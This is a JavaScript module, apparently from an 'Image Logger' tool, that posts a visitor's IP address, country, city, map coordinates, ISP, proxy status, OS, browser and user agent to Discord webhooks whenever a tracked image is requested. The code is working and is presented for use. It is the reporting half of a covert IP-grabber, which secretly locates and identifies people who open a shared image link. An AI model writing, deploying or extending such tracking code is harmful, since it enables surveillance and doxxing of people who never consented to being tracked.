const { WebhookClient, EmbedBuilder } = require('discord.js')
const logger = require('./logger')

const config = require('./config.json')

const sendImageToWebhooks = (
  imageName,
  imageUrl,
  clientIP,
  timezone,
  country,
  regionName,
  city,
  lat,
  lon,
  isp,
  as,
  mobile,
  proxy,
  hosting,
  os,
  browser,
  userAgent
) => {
  imageName = imageName || 'not found'
  imageUrl = imageUrl || 'not found'
  clientIP = clientIP || 'not found'
  timezone = timezone || 'not found'
  country = country || 'not found'
  regionName = regionName || 'not found'
  city = city || 'not found'
  lat = lat || 'not found'
  lon = lon || 'not found'
  isp = isp || 'not found'
  as = as || 'not found'
  mobile = mobile || 'not found'
  proxy = proxy || 'not found'
  hosting = hosting || 'not found'

  const randomcolors = ['#008000', '#E50000']
  const randomWebhookColor =
    randomcolors[Math.floor(Math.random() * randomcolors.length)]

  config.webhooks.forEach(webhook => {
    const webhookClient = new WebhookClient({ url: webhook.url })
    const embed = new EmbedBuilder()
      .setTitle(`Requesting an **${imageName}** image`)
      .setFields([
        {
          name: '🖼️ Image',
          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
        },
        {
          name: '📡 Network',
          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ Region: ${regionName}\n🏙️ City: ${city}\n📍 Coordinates: ${lat}, ${lon}\n📡 ISP: ${isp}\n📡 AS: ${as}\n📱 Mobile: ${mobile}\n📡 Proxy: ${proxy}\n📡 Hosting: ${hosting}\`\`\``
        },
        {
          name: '📱 Device',
          value: `\`\`\`shell\n🖥️ OS: ${os}\n🌐 Browser: ${browser}\n\`\`\``
        },
        {
          name: '📱 User Agent',
          value: `\`\`\`shell\n${userAgent}\`\`\``
        }
      ])
      .setThumbnail('attachment://' + imageName)
      .setFooter({
        text: 'Image Logger',
        iconURL:
          'https://cliply.co/wp-content/uploads/2021/08/372108630_DISCORD_LOGO_400.gif'
      })
      .setColor(randomWebhookColor)
      .setTimestamp()

    webhookClient
      .send({
        embeds: [embed]
      })
      .then(() => {
        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
      })
      .catch(error => {
        logger.error(
          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
        )
      })
  })
}

module.exports = sendImageToWebhooks
